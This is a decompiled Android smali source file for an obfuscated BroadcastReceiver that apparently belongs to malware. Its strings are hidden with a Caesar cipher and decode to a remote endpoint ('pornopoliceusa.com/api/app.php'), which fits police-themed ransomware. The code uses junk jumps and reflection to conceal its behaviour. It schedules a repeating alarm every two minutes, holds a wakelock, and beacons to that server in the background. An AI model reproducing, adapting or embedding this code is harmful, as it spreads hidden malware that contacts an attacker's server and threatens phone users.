.class public Lcom/EDzgPz/KwIOuS/pQpDXv;
.super Landroid/content/BroadcastReceiver;


# static fields
.field public static final ONE_TIME:Ljava/lang/String; = "pofujnf"


# direct methods
.method public constructor <init>()V
    .locals 4

    .prologue
    nop

    goto :goto_1

    :goto_0
    nop

    return-void

    nop

    goto :goto_2

    :goto_1
    nop

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    nop

    goto :goto_0

    :goto_2
    nop

    nop
.end method

.method private xCancelAlarm(Landroid/content/Context;)V
    .locals 9
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    nop

    goto/16 :goto_9

    :goto_0
    nop

    return-void

    nop

    goto/16 :goto_a

    :goto_1
    nop

    const/4 v5, 0x1

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Landroid/app/PendingIntent;

    aput-object v8, v6, v5

    aput-object v2, v7, v5

    const-string v5, "cancel"

    const-class v8, Landroid/app/AlarmManager;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v0, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_0

    :goto_2
    nop

    check-cast v0, Landroid/app/AlarmManager;

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v5, 0x1

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object v3, v7, v5

    const-string v5, "getSystemService"

    const-class v8, Landroid/content/Context;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, p1, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Object;

    nop

    goto :goto_2

    :goto_4
    nop

    const-string v3, "bmbsn"

    invoke-static/range {v3 .. v3}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_3

    :goto_5
    nop

    const/4 v5, 0x4

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Landroid/content/Context;

    aput-object v8, v6, v5

    aput-object p1, v7, v5

    const/4 v5, 0x1

    sget-object v8, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Integer;

    invoke-direct {v8, v4}, Ljava/lang/Integer;-><init>(I)V

    aput-object v8, v7, v5

    const/4 v5, 0x2

    const-class v8, Landroid/content/Intent;

    aput-object v8, v6, v5

    aput-object v1, v7, v5

    const/4 v5, 0x3

    sget-object v8, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Integer;

    invoke-direct {v8, v4}, Ljava/lang/Integer;-><init>(I)V

    aput-object v8, v7, v5

    const-string v5, "getBroadcast"

    const-class v8, Landroid/app/PendingIntent;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    const/4 v8, 0x0

    invoke-virtual {v5, v8, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/PendingIntent;

    nop

    goto :goto_4

    :goto_6
    nop

    invoke-direct {v1, p1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    nop

    goto :goto_5

    :goto_7
    nop

    const-class v3, Lcom/EDzgPz/KwIOuS/pQpDXv;

    nop

    goto :goto_6

    :goto_8
    nop

    new-instance v1, Landroid/content/Intent;

    nop

    goto :goto_7

    :goto_9
    nop

    const/4 v4, 0x0

    nop

    goto :goto_8

    :goto_a
    nop

    nop
.end method

.method private xSetAlarm(Landroid/content/Context;)V
    .locals 12
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    nop

    goto/16 :goto_1d

    :goto_0
    nop

    goto :goto_12

    nop

    goto/16 :goto_1e

    :goto_1
    nop

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    nop

    goto :goto_0

    :goto_2
    nop

    const-string v3, "Dpvmeo](u!gjoe!dpogjh!wbmvf!"

    invoke-static/range {v3 .. v3}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_1

    :goto_3
    nop

    const-string v2, "tvhbs"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_2

    :catch_0
    :goto_4
    move-exception v8

    nop

    goto :goto_3

    :goto_5
    nop

    return-void

    nop

    goto :goto_4

    :goto_6
    nop

    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V

    nop

    goto :goto_5

    :goto_7
    nop

    const-wide/32 v4, 0x1d4c0

    nop

    goto :goto_6

    :goto_8
    nop

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    nop

    goto :goto_7

    :goto_9
    nop

    invoke-static {p1, v1, v9, v1}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v6

    nop

    goto :goto_8

    :goto_a
    nop

    invoke-virtual {v9, v2, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    nop

    goto :goto_9

    :goto_b
    nop

    sget-object v3, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    nop

    goto :goto_a

    :goto_c
    nop

    const-string v2, "pofujnf"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_b

    :goto_d
    nop

    invoke-direct {v9, p1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    nop

    goto :goto_c

    :goto_e
    nop

    const-class v2, Lcom/EDzgPz/KwIOuS/pQpDXv;

    nop

    goto :goto_d

    :goto_f
    nop

    new-instance v9, Landroid/content/Intent;

    nop

    goto :goto_e

    :goto_10
    nop

    check-cast v0, Landroid/app/AlarmManager;

    nop

    goto :goto_f

    :goto_11
    nop

    invoke-virtual {p1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    nop

    goto :goto_10

    :goto_12
    nop

    const-string v2, "bmbsn"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_11

    :goto_13
    :try_start_0
    nop

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v11

    nop

    goto :goto_12

    :goto_14
    nop

    invoke-virtual {v2, v3}, Landroid/os/Bundle;->getInt(Ljava/lang/String;)I

    move-result v2

    nop

    goto :goto_13

    :goto_15
    nop

    const-string v3, "efgujnfs"

    invoke-static/range {v3 .. v3}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_14

    :goto_16
    nop

    iget-object v2, v7, Landroid/content/pm/ApplicationInfo;->metaData:Landroid/os/Bundle;

    nop

    goto :goto_15

    :goto_17
    nop

    invoke-virtual {v10, v2, v3}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v7

    nop

    goto :goto_16

    :goto_18
    nop

    const/16 v3, 0x80

    nop

    goto :goto_17

    :goto_19
    nop

    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_18
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_1a
    nop

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v11

    nop

    goto :goto_19

    :goto_1b
    nop

    const/16 v2, 0x6f2

    nop

    goto :goto_1a

    :goto_1c
    nop

    invoke-virtual {p1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v10

    nop

    goto :goto_1b

    :goto_1d
    nop

    const/4 v1, 0x0

    nop

    goto :goto_1c

    :goto_1e
    nop

    nop
.end method

.method private xonReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 13
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    nop

    goto/16 :goto_15

    :goto_0
    nop

    return-void

    nop

    goto/16 :goto_16

    :goto_1
    nop

    const/4 v9, 0x0

    new-array v10, v9, [Ljava/lang/Class;

    new-array v11, v9, [Ljava/lang/Object;

    const-string v9, "release"

    const-class v12, Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v12, v9, v10}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v9

    invoke-virtual {v9, v3, v11}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_0

    :goto_2
    nop

    invoke-virtual {v4, v5}, Lcom/EDzgPz/KwIOuS/VuqHca;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    nop

    goto :goto_1

    :goto_3
    nop

    aput-object v0, v5, v6

    nop

    goto :goto_2

    :goto_4
    nop

    const/4 v6, 0x2

    nop

    goto :goto_3

    :goto_5
    nop

    aput-object v2, v5, v8

    nop

    goto :goto_4

    :goto_6
    nop

    aput-object v7, v5, v6

    nop

    goto :goto_5

    :goto_7
    nop

    const-string v7, "iuuq;00qpsopqpmjdfvtb/dpn0bqj0bqq/qiq"

    invoke-static/range {v7 .. v7}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    nop

    goto :goto_6

    :goto_8
    nop

    const/4 v6, 0x0

    nop

    goto :goto_7

    :goto_9
    nop

    new-array v5, v5, [Ljava/lang/String;

    nop

    goto :goto_8

    :goto_a
    nop

    const/4 v5, 0x3

    nop

    goto :goto_9

    :goto_b
    nop

    invoke-direct {v4, p1}, Lcom/EDzgPz/KwIOuS/VuqHca;-><init>(Landroid/content/Context;)V

    nop

    goto :goto_a

    :goto_c
    nop

    new-instance v4, Lcom/EDzgPz/KwIOuS/VuqHca;

    nop

    goto :goto_b

    :goto_d
    nop

    const-string v0, ""

    invoke-static/range {v0 .. v0}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    nop

    goto :goto_c

    :goto_e
    nop

    const-string v2, "ujnfs"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_d

    :goto_f
    nop

    const/4 v9, 0x0

    new-array v10, v9, [Ljava/lang/Class;

    new-array v11, v9, [Ljava/lang/Object;

    const-string v9, "acquire"

    const-class v12, Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v12, v9, v10}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v9

    invoke-virtual {v9, v3, v11}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_e

    :goto_10
    nop

    const/4 v9, 0x2

    new-array v10, v9, [Ljava/lang/Class;

    new-array v11, v9, [Ljava/lang/Object;

    const/4 v9, 0x0

    sget-object v12, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v12, v10, v9

    new-instance v12, Ljava/lang/Integer;

    invoke-direct {v12, v8}, Ljava/lang/Integer;-><init>(I)V

    aput-object v12, v11, v9

    const/4 v9, 0x1

    const-class v12, Ljava/lang/String;

    aput-object v12, v10, v9

    aput-object v4, v11, v9

    const-string v9, "newWakeLock"

    const-class v12, Landroid/os/PowerManager;

    invoke-virtual {v12, v9, v10}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v9

    invoke-virtual {v9, v1, v11}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/os/PowerManager$WakeLock;

    nop

    goto :goto_f

    :goto_11
    nop

    const-string v4, "ZPVS!UBH"

    invoke-static/range {v4 .. v4}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    nop

    goto :goto_10

    :goto_12
    nop

    check-cast v1, Landroid/os/PowerManager;

    nop

    goto :goto_11

    :goto_13
    nop

    const/4 v9, 0x1

    new-array v10, v9, [Ljava/lang/Class;

    new-array v11, v9, [Ljava/lang/Object;

    const/4 v9, 0x0

    const-class v12, Ljava/lang/String;

    aput-object v12, v10, v9

    aput-object v4, v11, v9

    const-string v9, "getSystemService"

    const-class v12, Landroid/content/Context;

    invoke-virtual {v12, v9, v10}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v9

    invoke-virtual {v9, p1, v11}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/lang/Object;

    nop

    goto :goto_12

    :goto_14
    nop

    const-string v4, "qpxfs"

    invoke-static/range {v4 .. v4}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    nop

    goto :goto_13

    :goto_15
    nop

    const/4 v8, 0x1

    nop

    goto :goto_14

    :goto_16
    nop

    nop
.end method

.method private xsetOnetimeTimer(Landroid/content/Context;)V
    .locals 10
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    nop

    goto/16 :goto_d

    :goto_0
    nop

    return-void

    nop

    goto/16 :goto_e

    :goto_1
    nop

    const/4 v6, 0x3

    new-array v7, v6, [Ljava/lang/Class;

    new-array v8, v6, [Ljava/lang/Object;

    const/4 v6, 0x0

    sget-object v9, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v9, v7, v6

    new-instance v9, Ljava/lang/Integer;

    invoke-direct {v9, v5}, Ljava/lang/Integer;-><init>(I)V

    aput-object v9, v8, v6

    const/4 v6, 0x1

    sget-object v9, Ljava/lang/Long;->TYPE:Ljava/lang/Class;

    aput-object v9, v7, v6

    new-instance v9, Ljava/lang/Long;

    invoke-direct {v9, v3, v4}, Ljava/lang/Long;-><init>(J)V

    aput-object v9, v8, v6

    const/4 v6, 0x2

    const-class v9, Landroid/app/PendingIntent;

    aput-object v9, v7, v6

    aput-object v2, v8, v6

    const-string v6, "set"

    const-class v9, Landroid/app/AlarmManager;

    invoke-virtual {v9, v6, v7}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v6

    invoke-virtual {v6, v0, v8}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_0

    :goto_2
    nop

    const/4 v6, 0x0

    new-array v7, v6, [Ljava/lang/Class;

    new-array v8, v6, [Ljava/lang/Object;

    const-string v6, "currentTimeMillis"

    const-class v9, Ljava/lang/System;

    invoke-virtual {v9, v6, v7}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v6

    const/4 v9, 0x0

    invoke-virtual {v6, v9, v8}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Ljava/lang/Long;

    invoke-virtual {v6}, Ljava/lang/Long;->longValue()J

    move-result-wide v3

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v6, 0x4

    new-array v7, v6, [Ljava/lang/Class;

    new-array v8, v6, [Ljava/lang/Object;

    const/4 v6, 0x0

    const-class v9, Landroid/content/Context;

    aput-object v9, v7, v6

    aput-object p1, v8, v6

    const/4 v6, 0x1

    sget-object v9, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v9, v7, v6

    new-instance v9, Ljava/lang/Integer;

    invoke-direct {v9, v5}, Ljava/lang/Integer;-><init>(I)V

    aput-object v9, v8, v6

    const/4 v6, 0x2

    const-class v9, Landroid/content/Intent;

    aput-object v9, v7, v6

    aput-object v1, v8, v6

    const/4 v6, 0x3

    sget-object v9, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v9, v7, v6

    new-instance v9, Ljava/lang/Integer;

    invoke-direct {v9, v5}, Ljava/lang/Integer;-><init>(I)V

    aput-object v9, v8, v6

    const-string v6, "getBroadcast"

    const-class v9, Landroid/app/PendingIntent;

    invoke-virtual {v9, v6, v7}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v6

    const/4 v9, 0x0

    invoke-virtual {v6, v9, v8}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/PendingIntent;

    nop

    goto :goto_2

    :goto_4
    nop

    const/4 v6, 0x2

    new-array v7, v6, [Ljava/lang/Class;

    new-array v8, v6, [Ljava/lang/Object;

    const/4 v6, 0x0

    const-class v9, Ljava/lang/String;

    aput-object v9, v7, v6

    aput-object v3, v8, v6

    const/4 v6, 0x1

    const-class v9, Ljava/io/Serializable;

    aput-object v9, v7, v6

    aput-object v4, v8, v6

    const-string v6, "putExtra"

    const-class v9, Landroid/content/Intent;

    invoke-virtual {v9, v6, v7}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v6

    invoke-virtual {v6, v1, v8}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_3

    :goto_5
    nop

    sget-object v4, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    nop

    goto :goto_4

    :goto_6
    nop

    const-string v3, "pofujnf"

    invoke-static/range {v3 .. v3}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_5

    :goto_7
    nop

    invoke-direct {v1, p1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    nop

    goto :goto_6

    :goto_8
    nop

    const-class v3, Lcom/EDzgPz/KwIOuS/pQpDXv;

    nop

    goto :goto_7

    :goto_9
    nop

    new-instance v1, Landroid/content/Intent;

    nop

    goto :goto_8

    :goto_a
    nop

    check-cast v0, Landroid/app/AlarmManager;

    nop

    goto :goto_9

    :goto_b
    nop

    const/4 v6, 0x1

    new-array v7, v6, [Ljava/lang/Class;

    new-array v8, v6, [Ljava/lang/Object;

    const/4 v6, 0x0

    const-class v9, Ljava/lang/String;

    aput-object v9, v7, v6

    aput-object v3, v8, v6

    const-string v6, "getSystemService"

    const-class v9, Landroid/content/Context;

    invoke-virtual {v9, v6, v7}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v6

    invoke-virtual {v6, p1, v8}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Object;

    nop

    goto :goto_a

    :goto_c
    nop

    const-string v3, "bmbsn"

    invoke-static/range {v3 .. v3}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_b

    :goto_d
    nop

    const/4 v5, 0x0

    nop

    goto :goto_c

    :goto_e
    nop

    nop
.end method


# virtual methods
.method public CancelAlarm(Landroid/content/Context;)V
    .locals 4

    invoke-direct {p0, p1}, Lcom/EDzgPz/KwIOuS/pQpDXv;->xCancelAlarm(Landroid/content/Context;)V

    return-void
.end method

.method public SetAlarm(Landroid/content/Context;)V
    .locals 4

    invoke-direct {p0, p1}, Lcom/EDzgPz/KwIOuS/pQpDXv;->xSetAlarm(Landroid/content/Context;)V

    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 4

    invoke-direct {p0, p1, p2}, Lcom/EDzgPz/KwIOuS/pQpDXv;->xonReceive(Landroid/content/Context;Landroid/content/Intent;)V

    return-void
.end method

.method public setOnetimeTimer(Landroid/content/Context;)V
    .locals 4

    invoke-direct {p0, p1}, Lcom/EDzgPz/KwIOuS/pQpDXv;->xsetOnetimeTimer(Landroid/content/Context;)V

    return-void
.end method
